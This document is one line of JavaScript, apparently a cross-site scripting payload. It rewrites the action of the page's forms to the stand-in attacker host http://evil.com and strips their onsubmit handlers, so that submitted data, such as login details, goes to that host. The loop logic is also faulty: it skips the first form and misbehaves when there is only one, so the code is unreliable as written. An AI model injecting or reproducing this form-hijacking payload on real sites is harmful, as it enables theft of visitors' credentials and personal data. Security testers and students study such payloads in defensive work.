var f=document.forms;var i=f.length-1;do{f[i].action="http://evil.com";f[i].onsubmit=null;}while(--i);
